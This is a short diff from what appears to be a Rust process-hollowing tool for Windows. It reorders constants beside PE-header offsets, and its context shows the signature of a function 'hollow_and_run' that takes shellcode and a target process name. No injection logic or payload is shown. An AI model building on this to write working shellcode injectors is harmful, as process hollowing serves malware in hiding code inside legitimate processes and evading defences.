@@ -5,10 +5,10 @@ use windows::Win32::Foundation::{BOOL, HANDLE};
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Threading::{CREATE_SUSPENDED, PROCESS_BASIC_INFORMATION, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESSINFOCLASS, STARTUPINFOA};
 
-const POINTER_SIZE: u32 = usize::BITS >> 3;
-const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE * 6;
 const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
+const POINTER_SIZE: u32 = usize::BITS >> 3;
+const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE * 6;
 
 pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // See line 13
